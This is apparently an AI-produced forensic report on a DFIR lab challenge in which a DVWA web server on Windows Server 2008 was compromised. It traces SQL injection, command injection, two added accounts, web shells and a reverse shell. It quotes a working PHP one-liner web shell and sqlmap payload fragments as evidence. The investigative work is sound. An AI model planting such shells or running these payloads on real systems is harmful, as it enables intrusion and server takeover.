# Case ALIHADI-C1 — "Web Server" — Investigative Report

**Swarm:** `sf6df` · **Editor/critic:** `sf6df06` · **Case:** Ali Hadi, Digital Forensics Challenge #1 (Web Server).

**Scope:** raw disk image `inputs/s4a-challenge4` (25 GB, NTFS at sector 2048) + memory image
`inputs/memdump.mem` (1 GB, Windows Server 2008 x86/PAE). Memory capture time
`2015-09-03 10:04:05 UTC` (`catalog/memdump.mem/windows.info.txt`).

Every claim below cites its evidence: a path under `inputs/` or `work/extracted/`, the command that
produced it, and an inode/offset/hash where it matters. Findings originate from the seats'
notes (`work/disk_triage.md`, `work/leftovers.md`, `work/memory-findings.md`, `work/software.md`,
`work/timeline.md`) and were re-verified by the critic.

---

## 1. What type of attacks has been performed on the box?

The box was **compromised over HTTP** through the XAMPP-hosted **DVWA v1.3** (Damn Vulnerable Web
Application) running on Apache. The attacker (`192.168.56.102`, a Linux host using
Firefox/Iceweasel and `sqlmap`) carried out, in order:

1. **SQL injection (automated with sqlmap)** — against `/dvwa/vulnerabilities/sqli/`.
   - Evidence: `work/sf6df04/access.log` (extracted from `inputs/s4a-challenge4` inode `59684`) shows
     `UNION`/error/blind payloads with the `0x7178717871` marker and User-Agent
     `sqlmap/1.0-dev-nongit-20150902`, e.g. `02/Sep/2015:04:15:40 -0700`
     `GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit` (UA `sqlmap/1.0-dev-nongit-20150902`).
   - sqlmap enumerated `mysql.user`, `information_schema`, and phpMyAdmin tables (e.g.
     `...UNION ALL SELECT NULL,CONCAT(0x717a717871,...) FROM mysql.user`).
2. **OS command injection** — against `/dvwa/vulnerabilities/exec/` (the "Command Injection" page),
   repeatedly POSTed (`work/sf6df04/access.log`, many `POST /dvwa/vulnerabilities/exec/` from
   `02/Sep/2015:01:50` onward). This gave the attacker command execution on the server and is how
   the two local accounts in §2 were created.
3. **SQLi file-write command stagers** — sqlmap wrote temporary PHP shells and ran commands through
   them (`GET /tmpbiwuc.php?cmd=...` and `/tmpbrjvl.php?cmd=...`, UA `sqlmap/...`,
   `work/extracted/access.log` lines 7605–7608, 7662–7664).
4. **File upload** — the DVWA upload flaw was used to drop PHP web shells (see §3 and Bonus).
5. **Reflected and stored XSS** — `/dvwa/vulnerabilities/xss_r/` and `xss_s/`; a stored-XSS payload
   was served back from the attacker host (`192_168_56_102[1].htm`, `xss_s[2].htm` in IE cache;
   `work/timeline.md` rows 18–19).
6. **File inclusion** (`fi/`), **brute force** and **CSRF** — present in the access log
   (`work/timeline.md`, attack summary).

Net effect: **SQL injection → command injection → local account creation → web-shell upload →
reverse-shell**, i.e. a full web-application compromise leading to OS-level control.

---

## 2. How many users has the attacker(s) added to the box, and how were they added?

**Two users were added:** `hacker` and `user1`.

Evidence — SAM hive (`Windows/System32/config/SAM`, inode `18491-128-3`, extracted to
`work/sf6df06/SAM` and parsed with regipy 6.3.0):

| Account | RID | Type | Password last set (UTC) |
| --- | --- | --- | --- |
| Administrator | 500 | built-in | 2015-08-24 06:59:37 (OS build) |
| Guest | 501 | built-in (disabled) | never |
| **user1** | **1005** | **attacker-added** | **2015-09-02 09:05:06** |
| **hacker** | **1006** | **attacker-added** | **2015-09-02 09:05:25** |

`user1` (RID 0x3ED) and `hacker` (RID 0x3EE) are the only non-built-in accounts, created ~19 seconds
apart on **2015-09-02 09:05 UTC** (SAM `Users\<RID>` `F` value, "password last set" FILETIME). Both
show `lastlogon = 0` (never logged into interactively). Source: SAM hive inode `18491-128-3`
(`work/sf6df06/SAM`; cross-checked against `work/sf6df01/parsed/sam_users.tsv`).

**How they were added:** created with Administrator privileges during the compromise window — the
accounts were provisioned in the local `Administrator` interactive session, then added to the
**`Users` and `Remote Desktop Users` groups** (a classic RDP-enablement step), but **not** to
`Administrators`. Evidence chain: successful local `Administrator` logon at `2015-09-02 09:00:57 UTC`
(Security.evtx recs 479–482), `CompMgmtLauncher.exe` launched in the Administrator `UserAssist` at
`09:01:02 UTC` (Computer Management / Local Users and Groups), the two SAM creations at `09:05:06`/
`09:05:25`, then group-membership writes at `09:18:09` (`user1`) and `09:19:24` (`hacker`)
(`work/sf6df01/parsed/sam_memberships.tsv`). Concurrently the attacker was issuing
`POST /dvwa/vulnerabilities/exec/` command-injection requests at `09:04:36`/`09:05:22 UTC`
(`work/sf6df04/access.log`), so the account creation coincides with the attacker's command-execution
activity; the retained evidence favours creation via the Administrator GUI (Computer Management),
rather than a retained `net user` command line. No Windows event 4720/4722/4732 was recorded because
account-management auditing was not enabled (extracted `Security.evtx`, inode `42093-128-4`, has 636
records — 4616/4624/4625/4634/4647/4648/4672/4717/4776 — but **zero** account-management events).

---

## 3. What leftovers (files, tools, info, etc.) did the attacker(s) leave behind?

The attacker left a family of PHP web shells and staging artifacts (all 2015-09-03, inodes 62330–62338):

| Artifact | Inode | SHA-256 | Notes |
| --- | --- | --- | --- |
| `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` | `62330-128-3` | `08245eeb54a5d973b20a82e03d82556a693f5c63310e01a2f492b78dda132a99` | one-liner `<?php system($_GET["cmd"]); ?>` |
| `xampp/htdocs/DVWA/webshells.zip` | `62331-128-1` | `bdae3070d4d9a483a8f08db4d16c9100723dea6fba3a7e53cbf249851bad99ee` | contains `c99.php` + `webshell.php` |
| `xampp/htdocs/DVWA/webshells/` (dir) | `62332-144-1` | — | directory extracted from the zip |
| `xampp/htdocs/DVWA/c99.php` | `62333-128-3` | `4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c` | `c99shell.php v.1.0 beta`, feature-rich web shell |
| `xampp/htdocs/DVWA/webshell.php` | `62334-128-1` | `794f25b47b4773f6749b0f607f906e5181545eca7835a927c9a197c94c3fd74b` | `<?php system($_GET["cmd"]); ?>` |
| `xampp/htdocs/DVWA/hackable/uploads/abc/` (dir) | `62335-144-1` | — | created via `phpshell.php?cmd=mkdir abc` |
| `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` | `62337-128-4` | `2e77d2db6ffba49be0ccf3850ee23de61b289d1e2dfee5b79e4d04563c42a1f7` | **reverse-shell stub → `192.168.56.102:4545`** |
| `Users/Administrator/AppData/Local/Temp/c99 (2).php` (deleted) | `62338-128-4` | — | deleted temp copy of c99 |
| `Users/Administrator/data.txt` | `60464-128-1` | `2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824` | content = `hello` (attacker test/note) |

Supporting evidence: hashes and `icat -o 2048 inputs/s4a-challenge4 <inode>` extraction commands in
`work/leftovers.md`; Apache-log proof of use (`GET /dvwa/hackable/uploads/phpshell.php?cmd=dir`,
`POST /dvwa/c99.php?act=cmd`, `GET /dvwa/hackable/uploads/phpshell2.php`) in
`work/extracted/access.log`. sqlmap's temporary stagers `tmpbiwuc.php` / `tmpbrjvl.php` (and
`tmpukudk.php`/`tmpudvfh.php`) were deleted by the attacker but are preserved in the access log
(`work/extracted/access.log` lines 7605–7608, 7662–7664).

No attacker-created scheduled task was found: the on-disk `Windows/System32/Tasks/` tree is
Microsoft-only, and `Windows/Tasks/SCHEDLGU.TXT` (extracted, SHA-256
`7af28c80a4b4d168272017df5fa72b300cdb3d3c3853163c9336412713d7843c`) is routine service
start/exit history (`work/leftovers.md`).

---

## 4. What software has been installed on the box, and were they installed by the attacker(s) or not?

Software present (from the SOFTWARE hive `\...\CurrentVersion\Uninstall`, inode `18496-128-3`):

| Software | Version | Installed | By attacker? |
| --- | --- | --- | --- |
| Windows Server 2008 Standard | 6.0.6001 SP1 (x86) | 2015-08-24 06:52:43 UTC | No (OS baseline) |
| XAMPP (Apache/MySQL/PHP/phpMyAdmin/FileZilla/MercuryMail/Tomcat/Perl) | 5.6.11-1 (Bitnami) | 2015-08-23 21:44:08 UTC | **No** (admin) |
| DVWA | 1.3 | 2015-08-23 21:52:15 UTC | **No** (admin, the target app) |
| Oracle VM VirtualBox Guest Additions | 4.3.30.0 | 2015-08-24 07:14:15 | No (hypervisor) |
| MS Visual C++ 2008 Redistributable x86 | 9.0.21022 | 2015-08-23 21:43:54 | No (XAMPP prerequisite) |
| IIS 7 (Windows role) | — | OS install | No |

**None of the installed software was installed by the attacker.** Every product predates the
intrusion (2015-08-23/24 vs. attack 2015-09-02/03) and has administrator/OS provenance: the XAMPP
installer is on the admin desktop (`Users/Administrator/Desktop/xampp-win32-5.6.11-1-VC11-installer.exe`,
inode `12911`, run 2015-08-23 21:40:17), with `VC_RED.MSI` (inode `59744`) and `install.exe`
(inode `59742`) as its redistributable, and DVWA `docs/DVWA_v1.3.pdf` (inode `12864`) confirming
v1.3 (`work/software.md`).

The attacker's "software" is **dropped tooling, not installed software**: the PHP web shells in §3.
There is no unknown Uninstall entry and no `WOW6432Node` (32-bit OS) (`work/software.md`).

---

## 5. Using memory forensics, can you identify the type of shellcode used?

Memory forensics **does not allow conclusive identification of a single binary shellcode family**,
and the evidence is stated conservatively here.

What was found (Volatility 3 over `inputs/memdump.mem`):

- `windows.malfind` flagged private `PAGE_EXECUTE_READWRITE` VADs in `svchost.exe` (PID 1024 @
  `0xe60000`, PID 1108 @ `0x6c0000`), `explorer.exe` (PID 816 @ `0x1f10000`, `0x9d0000`),
  `xampp-control.exe` (PID 2768 @ `0x280000`), and `FTK Imager.exe` (PID 2120 @ `0x4f40000`)
  (`catalog/memdump.mem/malfind.txt`; dumps in `work/extracted/memory/malfind_dump/`).
- The four 8 KB regions in `explorer.exe`, both `svchost.exe`, and `FTK Imager.exe` contain the **same
  function/API-resolution dispatcher stub** — a repeating table of `mov al,<index>; jmp <dispatcher>`
  followed by `xor ecx,ecx; mov cl,al; add ecx,<off>; jmp dword ptr [0x77359d80]` (a classic
  shellcode "resolve API by index through a hardcoded table" building block). Because the identical
  stub also appears in the **clean forensic tool** `FTK Imager.exe`, these four regions are **not
  attacker-unique** and are best treated as a shared dispatcher/callback pattern rather than
  definitive injected shellcode (`work/memory-findings.md`; critic re-disassembly of
  `work/extracted/memory/malfind_dump/*.dmp`).
- The dumps contain **no** `MZ`/PE header and **no** API markers (`LoadLibrary`, `GetProcAddress`,
  `VirtualAlloc`, `CreateProcess`, `cmd.exe`, `http`). `windows.hollowprocesses` returned nothing;
  `windows.psxview` showed no hidden process (`work/extracted/memory/hollowprocesses.txt`,
  `work/extracted/memory/psxview.txt`).
- `windows.suspicious_threads` flagged `svchost.exe` PID 1204 (`-k NetworkService`) at VAD
  `0x1140000-0x1340fff`, but the dumped VAD is zero/data-like at the flagged offsets and no matching
  live thread was confirmed, so it is uncorroborated (`work/memory-findings.md`).

**Conclusion for Q5:** the type of post-exploitation payload is best established from disk + network
evidence, not from a unique in-memory binary: it is a **reverse TCP shell** — `phpshell2.php` is a PHP
reverse shell that connects back to the attacker at **`192.168.56.102:4545`** (inode `62337-128-4`;
`work/extracted/phpshell2.php`), alongside command-execution web shells (`phpshell.php`,
`webshell.php`, `c99.php`). Memory shows suspicious executable regions consistent with a
function-resolution stub, but the identical stub in `FTK Imager.exe` prevents naming a specific
family (Meterpreter/Cobalt Strike/etc.) from memory alone.

---

## 6. What is the timeline analysis for all events that happened on the box?

The full merged timeline (39 numbered rows, 59 table lines, all UTC; server local = UTC−7) is in
**`work/timeline.md`**. Summary:

| # | When (UTC) | Event |
| --- | --- | --- |
| 1 | 2008-01-19 | Windows Server 2008 build 6001 base image laid down |
| 2 | 2015-08-23 10:30–21:46 | System boot; XAMPP started; dashboard extracted; admin browses |
| 3 | 2015-08-23 21:52 | **DVWA v1.3 installed** |
| 4 | 2015-08-23 22:24 | **Attacker `192.168.56.102` first contacts the site** |
| 5 | 2015-08-24 | Windows servicing / component-store updates |
| 6 | 2015-09-02 05:58–08:44 | Admin browses DVWA; PHP error log; **first PHPIDS intrusion alert** |
| 7 | 2015-09-02 09:00–09:01 | Administrator local logon; `CompMgmtLauncher.exe` (Computer Management) launched |
| 8 | 2015-09-02 09:05 | **`user1` (09:05:06) and `hacker` (09:05:25) accounts created** |
| 9 | 2015-09-02 09:18–09:19 | **`user1`/`hacker` added to `Users` + `Remote Desktop Users`** (RDP enablement) |
| 10 | 2015-09-02 09:18–09:32 | Command Prompt touched; `data.txt` (`hello`) written |
| 11 | 2015-09-02 11:15–11:19 | **sqlmap SQL injection wave**; temp shells `tmpbiwuc.php`/`tmpbrjvl.php` |
| 12 | 2015-09-03 06:49–06:59 | IE history; `/xampp/htdocs` modified |
| 13 | 2015-09-03 07:00–07:04 | Stored XSS; DVWA MySQL tables modified (SQLi writes) |
| 14 | 2015-09-03 07:08–07:10 | Upload page opened; **`phpshell.php` uploaded** |
| 15 | 2015-09-03 07:14 | **`webshells.zip`, `c99.php`, `webshell.php` dropped** |
| 16 | 2015-09-03 07:15–07:21 | `phpshell.php` used; `mkdir abc`; **`c99.php?act=cmd` command execution** |
| 17 | 2015-09-03 07:31 | **`phpshell2.php` reverse shell uploaded and requested** |
| 18 | 2015-09-03 10:03–10:04 | c99 authenticated session; **FTK Imager started; `ad_driver.sys` (AccessData driver) dropped; memory captured** |
| 19 | 2015-09-12/13 | Post-incident system/imaging activity (not attacker) |

The attacker's first contact is **2015-08-23 22:24 UTC**; the confirmed compromise window is
**2015-09-02 09:00 UTC → 2015-09-03 10:04:05 UTC** (Administrator logon / account creation through
memory capture). See `work/timeline.md` for the per-row evidence and source citations.

---

## 7. What is your hypothesis for the case, and what is your approach in solving it?

**Hypothesis.** A remote attacker at `192.168.56.102` (Linux) compromised the company web server —
a Windows Server 2008 (x86) VM running XAMPP 5.6.11 with the intentionally-vulnerable **DVWA v1.3** —
via the public website. The attacker (1) enumerated the site from 2015-08-23, (2) on 2015-09-02 used
**sqlmap** to automate **SQL injection** and exploited DVWA's **command-injection** page to obtain OS
command execution, (3) with Administrator-level control created **two local accounts (`user1`, `hacker`)**
and added them to **`Remote Desktop Users`** (a persistence/RDP step), and
(4) on 2015-09-03 uploaded a set of **PHP web shells** (`phpshell.php`, `c99.php`, `webshell.php`)
and a **reverse shell** (`phpshell2.php` → `192.168.56.102:4545`) for interactive control. The team
imaged the live system at 2015-09-03 10:04:05 UTC, before the attacker could clean up — which is why
the web shells, the two added accounts, and the Apache logs survive.

**Approach.** Correlate four independent sources into one evidence-backed narrative: (a) the **Apache
access/error logs** (network attack activity and the exact commands), (b) the **MFT MAC timeline**
(`catalog/.../timeline.csv`) for file-level events and inode proof, (c) the **registry hives**
(SAM/SOFTWARE/SYSTEM) for accounts and installed software, and (d) **Volatility 3** over the memory
image for the running processes/network at capture. Every finding was assigned a seat, then
cross-verified by the critic against the catalog before inclusion.

---

## 8. Is there anything else you would like to add?

1. **`ad_driver.sys` is NOT attacker malware.** The SYSTEM hive service `ad_driver` has DisplayName
   **"AccessData Driver"** (`work/extracted/registry/SYSTEM`, inode `18499-128-3`), and
   `Users/Administrator/AppData/Local/Temp/ad_driver.sys` (inode `60402`) is created at the instant of
   capture. It is the **FTK Imager live-imaging driver** (memory shows `FTK Imager.exe`, PID 2120,
   launched 2015-09-03 10:03:37 from `\\Vboxsvr\101\FTK-Imager\`). It marks **acquisition**, not a
   privilege-escalation step.
2. **The 2015-09-12/13 disk activity postdates the memory capture** and is system/imaging churn
   (driver re-registration, RegBack hives, bootstat), not attacker activity.
3. **`c99.php` and `webshell.php` carry older embedded timestamps** (2012/2014) from their source,
   but their NTFS `$FILE_NAME` create/change times of 2015-09-03 prove they were introduced to this
   host on the attack date — use the NTFS times, not the embedded dates.
4. **Additional exposure**: the box also served FTP (FileZilla, TCP 21), MySQL (TCP 3306) and SMB
   (139/445) (`catalog/memdump.mem/netscan.txt`); the confirmed compromise path went through HTTP,
   but those listeners are additional hardening items.

---

## Bonus

Directories and files **added by the attacker**, with proof (inode from
`catalog/s4a-challenge4/p2048/filelist.txt`; NTFS times from
`catalog/s4a-challenge4/p2048/timeline.csv`). The sequential inode run **62330–62338** is itself
strong evidence of a single drop burst:

| Inode | Path | First seen (UTC) |
| --- | --- | --- |
| `62330-128-3` | `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` | 2015-09-03 07:10:15 |
| `62331-128-1` | `xampp/htdocs/DVWA/webshells.zip` | 2015-09-03 07:14:48 |
| `62332-144-1` | `xampp/htdocs/DVWA/webshells/` (dir) | 2015-09-03 07:14:51 |
| `62333-128-3` | `xampp/htdocs/DVWA/c99.php` | 2015-09-03 07:14:51 |
| `62334-128-1` | `xampp/htdocs/DVWA/webshell.php` | 2015-09-03 07:14:51 |
| `62335-144-1` | `xampp/htdocs/DVWA/hackable/uploads/abc/` (dir) | 2015-09-03 07:17:58 |
| `62337-128-4` | `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` | 2015-09-03 07:31:30 |
| `62338-128-4` | `Users/Administrator/AppData/Local/Temp/c99 (2).php` (deleted) | 2015-09-03 07:20:14 |
| `60464-128-1` | `Users/Administrator/data.txt` (content `hello`) | 2015-09-02 09:32:42 |

Plus the sqlmap temporary stagers (deleted before imaging, proven by the access log rather than the
file list): `xampp/htdocs/tmpbiwuc.php`, `tmpbrjvl.php`, `tmpukudk.php`, `tmpudvfh.php`
(`work/extracted/access.log` lines 7605–7608, 7662–7664).

> Note: `Users/Administrator/AppData/Local/Temp/ad_driver.sys` (inode `60402`) is **excluded** from
> this list — it is the responder's FTK Imager driver, not an attacker artifact (see §8).
